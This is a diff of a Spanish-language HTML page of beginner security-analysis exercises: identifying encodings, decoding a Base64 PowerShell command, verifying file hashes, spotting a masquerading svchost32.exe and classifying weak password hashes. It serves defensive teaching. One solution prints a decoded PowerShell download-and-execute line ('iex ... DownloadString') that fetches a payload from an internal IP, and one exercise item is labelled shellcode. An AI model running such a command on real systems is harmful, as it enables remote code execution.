@@ -8,6 +8,8 @@
 </head>
 <body>
   <div class="container">
+<a href="index.html" class="section-back">← Ejercicios</a>
+
 <h1>🟢 Nivel 1 — Fácil</h1>
 
 <p>Ejercicios de identificación y decodificación. No requieren código.</p>
@@ -30,8 +32,8 @@ G) cG93ZXJzaGVsbA==
 H) 4831c04831ff4831f64831d2
 </code></pre>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;💡 Pistas&lt;/summary&gt;</p>
+<details>
+<summary>💡 Pistas</summary>
 
 <ul>
 <li>Base64: solo A-Za-z0-9+/=, longitud múltiplo de 4, puede terminar en =</li>
@@ -41,10 +43,10 @@ H) 4831c04831ff4831f64831d2
 <li>URL encoding: tiene %XX donde XX es hex</li>
 </ul>
 
-<p>&lt;/details&gt;</p>
+</details>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+<details>
+<summary>✅ Solución</summary>
 
 <pre><code>
 A) Base64        (termina en ==, chars válidos)
@@ -57,7 +59,7 @@ G) Base64        (termina en ==) → decodifica a &quot;powershell&quot;
 H) Hex           (shellcode x86-64: xor rax, rax; xor rdi, rdi...)
 </code></pre>
 
-<p>&lt;/details&gt;</p>
+</details>
 
 <hr>
 
@@ -79,8 +81,8 @@ CommandLine: powershell -NoProfile -NonInteractive -enc
 <li>¿Qué IOC encontrás en el payload decodificado?</li>
 </ol>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;💡 Pistas&lt;/summary&gt;</p>
+<details>
+<summary>💡 Pistas</summary>
 
 <ul>
 <li>PowerShell <code>-enc</code> usa Base64 con encoding UTF-16LE (no UTF-8)</li>
@@ -88,10 +90,10 @@ CommandLine: powershell -NoProfile -NonInteractive -enc
 <li>En Python: <code>base64.b64decode(s).decode(&#x27;utf-16-le&#x27;)</code></li>
 </ul>
 
-<p>&lt;/details&gt;</p>
+</details>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+<details>
+<summary>✅ Solución</summary>
 
 <p><strong>1.</strong> Base64 (UTF-16LE — encoding de PowerShell)</p>
 
@@ -113,7 +115,7 @@ iex (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.100/payload
 <p><strong>Severidad:</strong> ALTA — ejecución remota de código, técnica LOLBin (PowerShell)</p>
 <p><strong>MITRE:</strong> T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)</p>
 
-<p>&lt;/details&gt;</p>
+</details>
 
 <hr>
 
@@ -136,8 +138,8 @@ SHA-256: 3ba4c89ddf79a716dad00e3a7a3e0620b0b8f8e96c7e0da8f57e0c7e0a4a8d2f
 <li>¿Qué hubiese pasado si el segundo hash fuera diferente?</li>
 </ol>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+<details>
+<summary>✅ Solución</summary>
 
 <ol>
 <li><strong>No fue modificada</strong> — los hashes son idénticos</li>
@@ -151,7 +153,7 @@ SHA-256: 3ba4c89ddf79a716dad00e3a7a3e0620b0b8f8e96c7e0da8f57e0c7e0a4a8d2f
 
 <p><strong>Lección:</strong> Siempre hashear ANTES de tocar. Siempre trabajar con copias.</p>
 
-<p>&lt;/details&gt;</p>
+</details>
 
 <hr>
 
@@ -172,8 +174,8 @@ SHA-256: 0000000000000000000000000000000000000000000000000000000000000000
 <li>El SHA-256 todo en ceros, ¿qué indica?</li>
 </ol>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+<details>
+<summary>✅ Solución</summary>
 
 <ol>
 <li><code>svchost32.exe</code> — el legítimo es <code>svchost.exe</code> (sin &quot;32&quot;). Técnica común: nombres similares para pasar desapercibidos (masquerading — T1036).</li>
@@ -193,7 +195,7 @@ SHA-256: 0000000000000000000000000000000000000000000000000000000000000000
 <p>   - El archivo estaba vacío (SHA-256 de un archivo vacío es <code>e3b0c...</code>, no todo zeros)</p>
 <p>   - El log fue manipulado</p>
 
-<p>&lt;/details&gt;</p>
+</details>
 
 <hr>
 
@@ -216,8 +218,8 @@ usuario5: 356a192b7913b04c54574d18c28d46e6395428ab
 <li>¿Cuáles son seguros con la tecnología actual?</li>
 </ol>
 
-<p>&lt;details&gt;</p>
-<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+<details>
+<summary>✅ Solución</summary>
 
 <pre><code>
 usuario1: MD5       (32 chars) → &quot;password&quot; — RIESGO CRÍTICO (rainbow tables)
@@ -233,7 +235,7 @@ usuario5: SHA-1     (40 chars) → &quot;1&quot; — RIESGO ALTO (debería ser b
 
 <p><strong>Acción:</strong> Notificar a todos los usuarios afectados. Forzar reset de contraseñas para usuario1, usuario3, usuario5. Implementar bcrypt/Argon2 para toda la base.</p>
 
-<p>&lt;/details&gt;</p>
+</details>
 
 <hr>
 
